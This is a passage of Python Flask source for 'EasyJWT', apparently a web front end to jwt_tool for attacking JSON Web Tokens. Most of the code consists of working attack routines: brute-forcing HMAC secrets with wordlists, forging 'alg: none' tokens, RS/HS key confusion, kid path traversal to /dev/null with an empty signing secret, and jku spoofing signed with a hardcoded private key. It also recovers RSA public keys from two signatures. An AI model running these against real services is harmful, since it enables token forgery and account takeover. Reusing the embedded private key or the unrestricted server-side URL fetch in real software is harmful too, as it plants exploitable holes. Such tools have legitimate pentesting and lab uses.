import base64
import hashlib
import hmac
import re
import jwt
import glob
import json
import os
import subprocess
import tempfile
import time
import urllib.error
import urllib.request
from functools import wraps

from flask import Flask, jsonify, render_template, request, Response, send_from_directory

app = Flask(__name__)

WORDLISTS_DIR = "/wordlists"
JWT_TOOL = "jwt_tool.py"
MAX_CUSTOM_WORDLIST_BYTES = 2 * 1024 * 1024  # 2 MB
SITE_URL = os.environ.get("SITE_URL", "https://easyjwt.imegz.dev")

# Fixed keypair used for the "Spoof JWKS" exploit when no JWKS URL is given.
# This is intentionally baked into the source and shipped with every copy of
# EasyJWT (local installs and the live site alike), rather than generated per
# instance: the whole point of a default is that a token self-signed by any
# install is verifiable against the SAME public key served from /jwks.json
# on the live site, so solo users without their own hosting still have a
# real, working jku target to point a lab at. It is not a secret, it exists
# purely so test tokens can be forged and verified.
DEFAULT_JWKS_KID = "easyjwt-default-1"
DEFAULT_JWKS_PRIVATE_KEY_PEM = """-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDj/Ff91kLspLjP
8L4UefVBr8KwUEtNpGccbgA1GZGRrBJ3bIzXwyQCY5q+Ux4tw1E4QizhVEgRD09t
x8/1cGJH6/TfR6IBNqCQY1zxGaLxN9XaDmVrioeX2NAVv62ppIb/6Hvbpne4L5Or
GhMzLkoN06+vAuETxZh/J3f0993Vx52KjGNR5h/HRQJK9ZXMDRQb0GiIoDuYsKG/
Kx5aR3IYa1kNgj2jlE3Dzp6GEZzdjgN44ZdHSodoPCp5r9gN7kylWN8YFsWXXOxC
5RV9hzI5GO2LwosUiGQ4Z14iqH1OfKfXGkovsP+RVeQln0Zyg+q6lyivKy6CK91a
iXKxb4wDAgMBAAECggEATdqigcBlYkJuCjR/9KYhJqlKpsMEtCLsQz0dPQTaPRCx
za53+kZdSaOR+GSR7bbBSaDvipMpeQntaePOFFaoeT8OhCEGJbvt4ODNoFfM2Ork
UG6SG8NWwnf7tzGZsFDK+SD/CucyAufcWZWx8Mxh5Y7gc7db/VCA3wsvX6w1SQcY
rhpOTYIMUBLAT0a8gt74kCuoghmET21Nptt1yA5jiJel5L+OxtMVQlvBTlmApwQc
VawxC2+RTHYXfWWw7jwMKoORIPYq7O9nHvDvrTfOmfkG7shjQsMdFkt2l4QiqSAj
EA2fCcTTgGUL053SATqUu52QQTQGlODWH7N0hV33wQKBgQD3QJh/JKNZWtZXVLXn
WBPCBkEhj2/JWytRb2P+GmoWJothSccp+dfUQQ798HNxZAuJTCTT9PSeD9ZfKVIO
XxI4vJZtWnsH3F8sTmAyhrRUIdTbTv9TO7TiGI28Fk6jS9HZ53hVlkN+n+Wi8ORD
Fpl/pPAt0eimhK5PiQIgcPPJyQKBgQDsDT9KiH4ZQwjbtrSuBdjjACTMGcocNblT
MT8WsTK+MVi7o0YWG0d6UV39Wg7sAZ9bLZnGZDgGZkS2ut7tjlEL07cZ4n670ai8
c3F02kdFS0sy3OnP5qmwmHRSK+QNj+Gd787OTyswoP6kZUIEmvWm0M9t0LhC+ynh
FjBiTXMNawKBgCrBk91gs5KvH6OodXBVDc2ekULBcB5M0rfZYFw/qxq7fZzMSlGa
79S3j2UgYIY6O7h5X2D72hU/Pd3k4liz3g3LpuOwIthgJmEeCIqUOrjVxN5L0eFN
0ODMSC4/WUfpw5c/7NI4EuHhuq8rov1q+g5VsmbqBqZNCWudkK2VesLpAoGBAMPD
DL00S1eJ93u3n0o/QSqpANtfe/U/PM3YppicJhgDdrJOax6ESxgPCOLG4F8rzUvh
mokkri3ofI4Kljzu7Rng4BYQd8gtzUFUgEBHkhnOorOw8BtiEVKKbNWE3uG8dID1
003X7Fqs+eG+tCx7ksRgodZR5a5u+8FXFJNB5eu3AoGBAONKYDa/hdqwIIVFtYwf
VOsizMZNA/25Quvjyf7mZOQ9kx+Xg3B6wbkHijdDzKLVU69mHO2iyFlKFXIgVklG
tMTk3r8lpILN25Eo1xDUmtOvWY5VAWOjL39Ms4kDwzml6utKHeEbSXOpgtn/d0kH
lXEwmkWUVCJ2dFomEEUM7M/u
-----END PRIVATE KEY-----"""


def _default_jwks_public_key():
    from cryptography.hazmat.primitives import serialization
    private_key = serialization.load_pem_private_key(
        DEFAULT_JWKS_PRIVATE_KEY_PEM.encode(), password=None,
    )
    return private_key.public_key()


def _b64url_uint(n):
    byte_len = (n.bit_length() + 7) // 8
    return b64url_encode(n.to_bytes(byte_len, "big"))


_DEFAULT_JWKS_PUBLIC_NUMBERS = _default_jwks_public_key().public_numbers()

AUTH_USER = os.environ.get("AUTH_USER")
AUTH_PASS = os.environ.get("AUTH_PASS")

RATE_LIMIT_SECONDS = float(os.environ.get("RATE_LIMIT_SECONDS", "3"))
_last_request = {}


def auth_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if AUTH_USER and AUTH_PASS:
            auth = request.authorization
            if not auth or auth.username != AUTH_USER or auth.password != AUTH_PASS:
                return Response(
                    "Authentication required", 401,
                    {"WWW-Authenticate": 'Basic realm="EasyJWT"'},
                )
        return f(*args, **kwargs)
    return wrapper


def rate_limited(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown").split(",")[0].strip()
        now = time.time()
        last = _last_request.get(ip, 0)
        if now - last < RATE_LIMIT_SECONDS:
            wait = round(RATE_LIMIT_SECONDS - (now - last), 1)
            return jsonify({"error": f"Too many requests, wait {wait}s and try again"}), 429
        _last_request[ip] = now
        return f(*args, **kwargs)
    return wrapper


def b64url_decode(segment):
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


_HMAC_HASHFUNCS = {"hs256": hashlib.sha256, "hs384": hashlib.sha384, "hs512": hashlib.sha512}


def encode_hmac_allow_empty(payload, header, secret, alg):
    """Same job as jwt.encode(), but PyJWT hard-refuses an empty HMAC key
    ("HMAC key must not be empty"), while signing with one is itself a
    real, deliberate attack: a kid header path-traversal pointing at a
    predictable empty file (classically /dev/null) means the server's own
    "secret" IS an empty string, and the only way to forge a matching
    token is to sign with one too. Build the token by hand in that case."""
    if secret:
        return jwt.encode(payload, secret, algorithm=alg.upper(), headers=header)
    hashfunc = _HMAC_HASHFUNCS.get(alg.lower())
    if hashfunc is None:
        raise ValueError(f"Unsupported HMAC algorithm: {alg}")
    header = dict(header)
    # PyJWT's encode() auto-adds "typ": "JWT" whenever the header has no
    # typ key at all; replicate that here so add_typ behaves the same way
    # whether or not the secret happens to be empty. A header that already
    # has typ set to None was explicitly suppressed (see /api/forge above)
    # and json.dumps() won't drop that key on its own like PyJWT does, so
    # strip None-valued keys after this, not before.
    if "typ" not in header:
        header["typ"] = "JWT"
    header = {k: v for k, v in header.items() if v is not None}
    header["alg"] = alg.upper()
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(b"", signing_input, hashfunc).digest()
    return f"{header_b64}.{payload_b64}.{b64url_encode(signature)}"


ANSI_ESCAPE_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")


def strip_ansi(text):
    return ANSI_ESCAPE_RE.sub("", text)


def strip_banner(text):
    # jwt_tool prints its ASCII art banner on every run, drop everything
    # up through the "@ticarpi" credit line so the web UI only shows
    # the actual result.
    marker = "@ticarpi"
    idx = text.find(marker)
    if idx != -1:
        text = text[idx + len(marker):]
    return text.lstrip("\n")


# Lines jwt_tool prints on a fresh container (config bootstrap, config file
# path) that carry no useful information for someone using the web UI.
NOISE_LINE_PATTERNS = (
    "No config file yet created",
    "Running config setup",
    'Configuration file built',
    'Make sure to set the "httplistener"',
    "/jwtconf.ini",
)


def strip_noise_lines(text):
    lines = text.split("\n")
    kept = [
        line for line in lines
        if not any(pattern in line for pattern in NOISE_LINE_PATTERNS)
    ]
    return "\n".join(kept)


def run_jwt_tool(args, timeout=120):
    result = subprocess.run(
        ["python3", JWT_TOOL] + args,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    combined = result.stdout + result.stderr
    combined = strip_ansi(combined)
    combined = strip_banner(combined)
    combined = strip_noise_lines(combined)
    return combined.strip()


def builtin_wordlist_paths():
    if not os.path.isdir(WORDLISTS_DIR):
        return []
    return sorted(glob.glob(os.path.join(WORDLISTS_DIR, "*.txt")))


@app.route("/")
@auth_required
def index():
    return render_template("index.html")


@app.route("/robots.txt")
def robots_txt():
    content = (
        "User-agent: *\n"
        "Allow: /\n"
        "Disallow: /api/\n"
        "\n"
        f"Sitemap: {SITE_URL}/sitemap.xml\n"
    )
    return Response(content, mimetype="text/plain")


@app.route("/sitemap.xml")
def sitemap_xml():
    content = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
        "  <url>\n"
        f"    <loc>{SITE_URL}/</loc>\n"
        "    <changefreq>monthly</changefreq>\n"
        "    <priority>1.0</priority>\n"
        "  </url>\n"
        "</urlset>\n"
    )
    return Response(content, mimetype="application/xml")


@app.route("/favicon.ico")
def favicon_ico():
    return send_from_directory(
        os.path.join(app.root_path, "static"), "favicon.ico",
        mimetype="image/vnd.microsoft.icon",
    )


@app.route("/jwks.json")
def jwks_json():
    # Intentionally public, no auth: this is the whole point of the
    # default key, external servers under test must be able to fetch it
    # with no credentials when they follow a spoofed jku header.
    return jsonify({
        "keys": [{
            "kty": "RSA",
            "use": "sig",
            "alg": "RS256",
            "kid": DEFAULT_JWKS_KID,
            "n": _b64url_uint(_DEFAULT_JWKS_PUBLIC_NUMBERS.n),
            "e": _b64url_uint(_DEFAULT_JWKS_PUBLIC_NUMBERS.e),
        }]
    })


@app.route("/api/decode", methods=["POST"])
@auth_required
def decode():
    token = request.json.get("token", "").strip()
    parts = token.split(".")
    if len(parts) < 2:
        return jsonify({"error": "That does not look like a JWT, expected at least two dot separated parts"}), 400

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as exc:
        return jsonify({"error": f"Could not decode token: {exc}"}), 400

    signature = parts[2] if len(parts) > 2 else ""
    return jsonify({
        "header": json.dumps(header, indent=2),
        "payload": json.dumps(payload, indent=2),
        "signature": signature,
    })


@app.route("/api/crack", methods=["POST"])
@auth_required
@rate_limited
def crack():
    token = request.form.get("token", "").strip()
    if not token:
        return jsonify({"error": "Token is required"}), 400

    results = {}
    tmp_custom_path = None

    try:
        upload = request.files.get("wordlist")
        if upload and upload.filename:
            upload.seek(0, os.SEEK_END)
            size = upload.tell()
            upload.seek(0)
            if size > MAX_CUSTOM_WORDLIST_BYTES:
                return jsonify({"error": "Custom wordlist is too large, 2 MB max"}), 400

            fd, tmp_custom_path = tempfile.mkstemp(suffix=".txt")
            with os.fdopen(fd, "wb") as f:
                f.write(upload.read())

            try:
                results["Your wordlist"] = run_jwt_tool([token, "-C", "-d", tmp_custom_path])
            except subprocess.TimeoutExpired:
                results["Your wordlist"] = "Crack timed out after 120s, try a smaller wordlist"

        builtins = builtin_wordlist_paths()
        if builtins:
            try:
                combined_fd, combined_path = tempfile.mkstemp(suffix=".txt")
                seen = set()
                with os.fdopen(combined_fd, "w") as out:
                    for path in builtins:
                        with open(path, "r", errors="ignore") as src:
                            for line in src:
                                line = line.rstrip("\n")
                                if line and line not in seen:
                                    seen.add(line)
                                    out.write(line + "\n")
                try:
                    results["Built-in wordlist"] = run_jwt_tool([token, "-C", "-d", combined_path])
                except subprocess.TimeoutExpired:
                    results["Built-in wordlist"] = "Crack timed out after 120s"
            finally:
                if os.path.exists(combined_path):
                    os.remove(combined_path)
        elif not results:
            return jsonify({"error": "No wordlists available, upload a custom one"}), 400

    finally:
        if tmp_custom_path and os.path.exists(tmp_custom_path):
            os.remove(tmp_custom_path)

    return jsonify({"results": results})


@app.route("/api/forge", methods=["POST"])
@auth_required
# No @rate_limited here: this route only does PyJWT/base64 work in-process,
# no jwt_tool subprocess, so it isn't the thing the rate limit protects.
# The guided Exploits flow calls this and then /api/exploit back to back,
# and sharing a limiter with that call would otherwise block the exploit
# call a few seconds after every forge.
def forge():
    data = request.json
    header_json = data.get("header_json", "").strip()
    payload_json = data.get("payload_json", "").strip()
    sign_alg = data.get("sign_alg", "").strip()
    secret = data.get("secret", "")
    private_key = data.get("private_key", "")
    add_typ = bool(data.get("add_typ"))

    if not header_json or not payload_json:
        return jsonify({"error": "Header and payload JSON are both required"}), 400

    try:
        header = json.loads(header_json)
    except Exception as exc:
        return jsonify({"error": f"Header is not valid JSON: {exc}"}), 400
    try:
        payload = json.loads(payload_json)
    except Exception as exc:
        return jsonify({"error": f"Payload is not valid JSON: {exc}"}), 400

    if not isinstance(header, dict):
        return jsonify({"error": "Header must be a JSON object"}), 400
    if not isinstance(payload, dict):
        return jsonify({"error": "Payload must be a JSON object"}), 400

    try:
        if not sign_alg:
            if add_typ:
                header.setdefault("typ", "JWT")
            header.setdefault("alg", "none")
            header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            token = f"{header_b64}.{payload_b64}."
        elif sign_alg.startswith("hs"):
            # An empty secret is deliberately allowed, not just tolerated:
            # signing with "" is itself a real attack (a predictable file
            # such as /dev/null read via a kid path-traversal header has
            # empty contents, so the forged token needs an empty-string
            # HMAC key to match it).
            # PyJWT's encode() silently injects "typ": "JWT" into the header
            # whenever the header dict has no "typ" key at all. Explicitly
            # setting it to None (falsy) tells PyJWT to leave it out, so the
            # header we send is exactly what the user wrote, unless they
            # opted in to the default via add_typ.
            if "typ" not in header and not add_typ:
                header["typ"] = None
            # jwt.encode() reads "alg" from the headers dict itself when
            # present, and uses THAT to pick the signing algorithm, not
            # the separate `algorithm=` argument. So if a token loaded
            # into the editor still has its old "alg" (e.g. "RS256") in
            # the header JSON and you only change the dropdown to HS256,
            # PyJWT would silently try to sign with the stale alg's
            # algorithm instead of what you actually selected. Force it
            # to match what was picked, every time.
            header["alg"] = sign_alg.upper()
            token = encode_hmac_allow_empty(payload, header, secret, sign_alg)
        else:
            if not private_key:
                return jsonify({"error": "This algorithm needs a private key"}), 400
            if "typ" not in header and not add_typ:
                header["typ"] = None
            header["alg"] = sign_alg.upper()  # see note above, same stale-alg hazard applies here
            token = jwt.encode(payload, private_key, algorithm=sign_alg.upper(), headers=header)
    except Exception as exc:
        return jsonify({"error": f"Could not build the token: {exc}"}), 400

    return jsonify({"token": token})


@app.route("/api/fetch-jwks-kids", methods=["POST"])
@auth_required
@rate_limited
def fetch_jwks_kids():
    # Lets the Spoof JWKS panel read back whatever kid(s) are actually
    # present at a URL the user is hosting themselves, instead of the
    # header having to hardcode one and hope it matches. Fetches the URL
    # server-side: a direct browser fetch would usually fail on these
    # URLs anyway (no CORS headers to allow it), and server-side also
    # means this works the same for a lab target the browser can't be
    # trusted to reach reliably.
    url = (request.json or {}).get("url", "").strip()
    if not url:
        return jsonify({"error": "A URL is required"}), 400
    if not url.startswith(("http://", "https://")):
        return jsonify({"error": "URL must start with http:// or https://"}), 400

    try:
        req = urllib.request.Request(url, headers={"User-Agent": "EasyJWT"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            raw = resp.read(1024 * 1024)  # 1 MB cap, a JWKS is never this big
    except urllib.error.HTTPError as exc:
        return jsonify({"error": f"Server responded with HTTP {exc.code}"}), 400
    except urllib.error.URLError as exc:
        return jsonify({"error": f"Could not reach that URL: {exc.reason}"}), 400
    except Exception as exc:
        return jsonify({"error": f"Could not fetch that URL: {exc}"}), 400

    try:
        body = json.loads(raw)
    except Exception as exc:
        return jsonify({"error": f"Response wasn't valid JSON: {exc}"}), 400

    keys = body.get("keys") if isinstance(body, dict) else None
    if not isinstance(keys, list):
        return jsonify({"error": 'Response has no "keys" array, is this a JWKS?'}), 400

    kids = [k.get("kid") for k in keys if isinstance(k, dict) and k.get("kid")]
    if not kids:
        return jsonify({"error": "No key in that JWKS has a kid"}), 400

    return jsonify({"kids": kids})


def _rsa_numbers_to_pem(n, e):
    """Build a PEM public key straight from the (n, e) integers, the same
    math jwt.io's own "JWK to PEM" box does."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    public_key = rsa.RSAPublicNumbers(e, n).public_key()
    return public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode()


def _jwk_to_pem(jwk):
    """Convert a single RSA JWK (its n/e fields) into a PEM public key.
    Only RSA is supported since that's what Key confusion needs (the HMAC
    secret for that attack is the server's RSA *public* key's bytes)."""
    if jwk.get("kty") != "RSA":
        raise ValueError(f'kty is "{jwk.get("kty")}", only RSA JWKs can be converted to PEM')
    n_b64, e_b64 = jwk.get("n"), jwk.get("e")
    if not n_b64 or not e_b64:
        raise ValueError("JWK is missing n or e")
    n = int.from_bytes(b64url_decode(n_b64), "big")
    e = int.from_bytes(b64url_decode(e_b64), "big")
    return _rsa_numbers_to_pem(n, e)


@app.route("/api/fetch-pubkey", methods=["POST"])
@auth_required
@rate_limited
def fetch_pubkey():
    # Lets Key confusion build its PEM straight from a URL instead of you
    # copying a JWK's n/e and converting by hand. Accepts whatever the URL
    # actually serves: a PEM directly, a single JWK, or a full JWKS (the
    # target's own /jwks.json, say) with one or more keys in it. Fetched
    # server-side, same reasoning as /api/fetch-jwks-kids: no CORS from the
    # browser, and it works the same against a lab target too.
    url = (request.json or {}).get("url", "").strip()
    if not url:
        return jsonify({"error": "A URL is required"}), 400
    if not url.startswith(("http://", "https://")):
        return jsonify({"error": "URL must start with http:// or https://"}), 400

    try:
        req = urllib.request.Request(url, headers={"User-Agent": "EasyJWT"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            raw = resp.read(1024 * 1024)  # 1 MB cap, none of these are ever this big
    except urllib.error.HTTPError as exc:
        return jsonify({"error": f"Server responded with HTTP {exc.code}"}), 400
    except urllib.error.URLError as exc:
        return jsonify({"error": f"Could not reach that URL: {exc.reason}"}), 400
    except Exception as exc:
        return jsonify({"error": f"Could not fetch that URL: {exc}"}), 400

    text = raw.decode("utf-8", errors="replace").strip()

    if text.startswith("-----BEGIN"):
        return jsonify({"pem": text, "note": "Fetched a PEM key directly from that URL."})

    try:
        body = json.loads(text)
    except Exception as exc:
        return jsonify({"error": f"Response wasn't a PEM key or valid JSON: {exc}"}), 400

    if isinstance(body, dict) and isinstance(body.get("keys"), list):
        keys = body["keys"]
    elif isinstance(body, dict) and body.get("kty"):
        keys = [body]
    else:
        return jsonify({
            "error": 'Response has no usable key, expected a PEM, a single JWK, '
                     'or a JWKS with a "keys" array'
        }), 400

    rsa_keys = [k for k in keys if isinstance(k, dict) and k.get("kty") == "RSA"]
    if not rsa_keys:
        return jsonify({"error": "No RSA key found there (only RSA keys can become a PEM for Key confusion)"}), 400

    try:
        pem = _jwk_to_pem(rsa_keys[0])
    except Exception as exc:
        return jsonify({"error": f"Could not convert that key to PEM: {exc}"}), 400

    kid = rsa_keys[0].get("kid")
    if len(rsa_keys) == 1:
        note = f'Converted the RSA key there to PEM{f" (kid: {kid})" if kid else ""}.'
    else:
        note = (
            f"Found {len(rsa_keys)} RSA keys there, converted the first one"
            f'{f" (kid: {kid})" if kid else ""}. Edit the URL to narrow it down if that\'s the wrong one.'
        )

    return jsonify({"pem": pem, "note": note})


# RSA PKCS#1 v1.5 DigestInfo ASN.1 prefixes (RFC 8017), used below to
# rebuild exactly what a signer hashes and pads before raising it to the
# power e mod n. Only RS256/384/512 use this deterministic padding; PS*
# (RSASSA-PSS) salts every signature randomly, so two PSS signatures don't
# give you the same clean algebraic relationship and can't be attacked
# this way.
_PKCS1V15_DIGESTINFO = {
    "sha256": bytes.fromhex("3031300d060960864801650304020105000420"),
    "sha384": bytes.fromhex("3041300d060960864801650304020205000430"),
    "sha512": bytes.fromhex("3051300d060960864801650304020305000440"),
}
_ALG_TO_HASH = {"RS256": "sha256", "RS384": "sha384", "RS512": "sha512"}


def _pkcs1v15_padded_int(signing_input, hash_name, key_bytes):
    digest = hashlib.new(hash_name, signing_input).digest()
    digest_info = _PKCS1V15_DIGESTINFO[hash_name] + digest
    pad_len = key_bytes - len(digest_info) - 3
    if pad_len < 8:
        return None
    em = b"\x00\x01" + b"\xff" * pad_len + b"\x00" + digest_info
    return int.from_bytes(em, "big")


@app.route("/api/recover-pubkey", methods=["POST"])
@auth_required
@rate_limited
def recover_pubkey():
    # Key confusion needs the server's RSA public key, but plenty of
    # targets never expose one anywhere at all. If you have two tokens it
    # signed with RS256/384/512, you don't need it exposed: that padding
    # is deterministic, so for two genuine (message, signature) pairs
    # under the same key, n divides BOTH (sig1^e - padded_hash1) and
    # (sig2^e - padded_hash2) exactly, and in practice their GCD IS n.
    # This is the standard "recover an RSA public key from two signatures"
    # technique (the same one the well-known rsa_sign2n tool automates).
    # It needs gmpy2 to be fast enough to be usable: sig**65537 is a real,
    # ~17 MB integer for a 2048-bit key, and CPython's own bignum GCD on
    # numbers that size is impractically slow (minutes to effectively
    # never finishes), while GMP's does it in well under a minute.
    try:
        import gmpy2
    except ImportError:
        return jsonify({
            "error": "This needs the gmpy2 library installed on the server "
                     "(pip install gmpy2). Without it, the math here is too "
                     "slow to be usable (CPython's own big-integer GCD can "
                     "take many minutes on numbers this size)."
        }), 500

    data = request.json or {}
    token1 = data.get("token1", "").strip()
    token2 = data.get("token2", "").strip()

    if not token1 or not token2:
        return jsonify({"error": "Both tokens are required"}), 400
    if token1 == token2:
        return jsonify({"error": "Those are the same token twice, two DIFFERENT tokens signed with the same key are needed"}), 400

    def split_token(tok, label):
        parts = tok.split(".")
        if len(parts) != 3:
            raise ValueError(f"{label} doesn't look like a JWT (expected 3 parts)")
        try:
            header = json.loads(b64url_decode(parts[0]))
        except Exception as exc:
            raise ValueError(f"{label}: could not decode header: {exc}")
        alg = header.get("alg", "")
        if alg not in _ALG_TO_HASH:
            raise ValueError(
                f'{label} uses alg "{alg}", only RS256/RS384/RS512 can be attacked this way '
                "(PS256/384/512 randomize their padding, there's no key to recover from those)"
            )
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            sig_bytes = b64url_decode(parts[2])
        except Exception as exc:
            raise ValueError(f"{label}: could not decode signature: {exc}")
        # RSASSA-PKCS1-v1_5 (RFC 8017 8.2.1, step 4, I2OSP) always emits a
        # signature exactly as many bytes as the modulus itself, zero-padded
        # on the left if needed. So the key size isn't a guess, it's sitting
        # right here, which is what lets this skip trying multiple sizes.
        return alg, signing_input, int.from_bytes(sig_bytes, "big"), len(sig_bytes)

    try:
        alg1, si1, sig1, key_bytes1 = split_token(token1, "Token 1")
        alg2, si2, sig2, key_bytes2 = split_token(token2, "Token 2")
    except ValueError as exc:
        return jsonify({"error": str(exc)}), 400

    if alg1 != alg2:
        return jsonify({"error": f"Token 1 is {alg1} but Token 2 is {alg2}, both need the same algorithm"}), 400
    if sig1 == sig2:
        return jsonify({"error": "Those two tokens have the same signature, they need genuinely different signed content"}), 400
    if key_bytes1 != key_bytes2:
        return jsonify({
            "error": f"Token 1's signature is {key_bytes1} bytes but Token 2's is {key_bytes2}. A signature is "
                     "always exactly the key's own byte length, so these two can't be from the same RSA key."
        }), 400

    hash_name = _ALG_TO_HASH[alg1]
    key_bytes = key_bytes1
    e = 65537  # the near-universal default exponent; not configurable here
    mpz = gmpy2.mpz
    s1e = mpz(sig1) ** e  # exact, non-modular power: the whole trick needs this
    s2e = mpz(sig2) ** e

    m1 = _pkcs1v15_padded_int(si1, hash_name, key_bytes)
    m2 = _pkcs1v15_padded_int(si2, hash_name, key_bytes)
    if m1 is None or m2 is None:
        return jsonify({
            "error": f"A {key_bytes * 8}-bit key is too small to fit a {hash_name} digest with "
                     "PKCS#1 v1.5 padding, these tokens don't look genuine."
        }), 400

    expected_bits = key_bytes * 8
    g = gmpy2.gcd(s1e - mpz(m1), s2e - mpz(m2))
    n_candidate = g
    if n_candidate != 0:
        for small in (2, 3, 5, 7, 11, 13, 17, 19, 23):
            while n_candidate % small == 0:
                n_candidate //= small

    if n_candidate == 0 or abs(int(n_candidate).bit_length() - expected_bits) > 8:
        return jsonify({
            "error": f"Couldn't recover a {expected_bits}-bit key from these two tokens. Either they weren't "
                     "signed with the same RSA key, or the key uses a different exponent than 65537."
        }), 400

    n_candidate = int(n_candidate)
    # Sanity-check it actually verifies BOTH signatures before trusting it,
    # rather than handing back a GCD artifact that happens to be the right
    # size but isn't really the modulus.
    if pow(sig1, e, n_candidate) == m1 % n_candidate and pow(sig2, e, n_candidate) == m2 % n_candidate:
        try:
            pem = _rsa_numbers_to_pem(n_candidate, e)
        except Exception as exc:
            return jsonify({"error": f"Recovered a modulus but couldn't turn it into a PEM: {exc}"}), 400
        return jsonify({
            "pem": pem,
            "note": f"Recovered the {expected_bits}-bit RSA public key from these two tokens "
                    f"(e={e}), verified against both signatures.",
        })

    return jsonify({
        "error": f"The GCD produced a {expected_bits}-bit candidate, but it didn't verify against "
                 "both signatures. These two tokens probably weren't signed with the same RSA key, "
                 "or the key uses a different exponent than 65537."
    }), 400


@app.route("/api/exploit", methods=["POST"])
@auth_required
@rate_limited
def exploit():
    data = request.json
    token = data.get("token", "").strip()
    code = data.get("code", "").strip()
    pubkey = data.get("pubkey", "")
    jwks_url = data.get("jwks_url", "").strip()
    kid_override = data.get("kid", "").strip()
    kid_path = data.get("kid_path", "").strip()

    if not token or not code:
        return jsonify({"error": "Token and exploit code are required"}), 400

    args = [token, "-X", code]
    tmp_key_path = None

    if code == "k":
        if not pubkey:
            return jsonify({"error": "Key confusion needs a public key"}), 400
        fd, tmp_key_path = tempfile.mkstemp(suffix=".pem")
        with os.fdopen(fd, "w") as f:
            f.write(pubkey)
        args += ["-pk", tmp_key_path]
    elif code == "t":
        # kid header path traversal: not one of jwt_tool's own -X codes,
        # so build it ourselves the same way as Spoof JWKS above. Point
        # kid at a predictable file the server will read as the HMAC
        # secret when it looks the key up by that path; /dev/null is
        # empty on any Linux target, so the "secret" it reads back is an
        # empty string, and that's exactly what has to sign this token.
        parts = token.split(".")
        if len(parts) < 2:
            return jsonify({"error": "That does not look like a JWT"}), 400
        try:
            header = json.loads(b64url_decode(parts[0]))
            payload = json.loads(b64url_decode(parts[1]))
        except Exception as exc:
            return jsonify({"error": f"Could not decode token: {exc}"}), 400
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return jsonify({"error": "Token header/payload must be JSON objects"}), 400

        path = kid_path or "../../../../../../dev/null"
        header["kid"] = path
        header["alg"] = "HS256"
        if "typ" not in header:
            header["typ"] = None  # don't let PyJWT silently add one, see /api/forge

        try:
            new_token = encode_hmac_allow_empty(payload, header, "", "hs256")
        except Exception as exc:
            return jsonify({"error": f"Could not sign the token: {exc}"}), 400

        output = (
            f'kid set to "{path}", signed with alg: HS256 and an empty-string secret, '
            "the assumption being that path resolves to an empty (or otherwise "
            "predictable) file on the server and it reads that file's contents as "
            "the HMAC key. If this doesn't work, the server may store its keys "
            "somewhere else, try a different path.\n\n"
            f"New JWT:\n\n{new_token}"
        )
        return jsonify({"output": output})
    elif code == "s":
        # Always self-sign with EasyJWT's built-in default key, rather than
        # calling jwt_tool (which would generate its own random, unhosted
        # keypair every time). The URL field only controls where the jku
        # header points: EasyJWT's own hosted /jwks.json if left blank, or
        # any URL you paste in, e.g. your own exploit server, if the
        # target's network can't reach easyjwt.imegz.dev. Either way the
        # signature comes from the same fixed key, so whichever JWKS body
        # the target actually fetches, it only needs to contain THIS key's
        # public half (visit /jwks.json yourself in a browser and copy it
        # in, no need to generate a new key anywhere).
        parts = token.split(".")
        if len(parts) < 2:
            return jsonify({"error": "That does not look like a JWT"}), 400
        try:
            header = json.loads(b64url_decode(parts[0]))
            payload = json.loads(b64url_decode(parts[1]))
        except Exception as exc:
            return jsonify({"error": f"Could not decode token: {exc}"}), 400
        if not isinstance(header, dict) or not isinstance(payload, dict):
            return jsonify({"error": "Token header/payload must be JSON objects"}), 400

        # Default jku: honor an explicit SITE_URL env var if one's set (an
        # escape hatch for when this sits behind a proxy that doesn't forward
        # the real Host header), but otherwise derive it from how THIS
        # request actually reached the server. On the live site that's still
        # https://easyjwt.imegz.dev, same as before; run this locally or on a
        # LAN and it becomes whatever address you're actually using, so the
        # default is something a target on the same network can really fetch,
        # instead of always pointing at the public site no matter where
        # you're running from.
        site_url_override = os.environ.get("SITE_URL")
        base_url = site_url_override or request.host_url.rstrip("/")
        default_jwks_url = f"{base_url}/jwks.json"
        target_jku = jwks_url or default_jwks_url
        # kid still signs with the same fixed key either way, this only
        # changes what the header CLAIMS its kid is. Matters when your
        # own hosted JWKS copy ended up under a different kid than ours
        # (fetched via /api/fetch-jwks-kids, or picked from the dropdown)
        # and the target looks up keys by kid: it needs to match what's
        # actually hosted, not EasyJWT's own internal name for this key.
        # An empty kid_override means "Manual" was picked in the dropdown:
        # leave whatever kid (if any) was already in the header alone,
        # don't claim one at all. A non-empty value (the default kid, or
        # one fetched from the URL) overwrites it, same as before.
        header["alg"] = "RS256"
        header["jku"] = target_jku
        if kid_override:
            header["kid"] = kid_override
        if "typ" not in header:
            header["typ"] = None  # don't let PyJWT silently add one, see /api/forge

        try:
            new_token = jwt.encode(payload, DEFAULT_JWKS_PRIVATE_KEY_PEM, algorithm="RS256", headers=header)
        except Exception as exc:
            return jsonify({"error": f"Could not sign the token: {exc}"}), 400

        kid_note = (
            f'kid set to "{header["kid"]}".'
            if "kid" in header
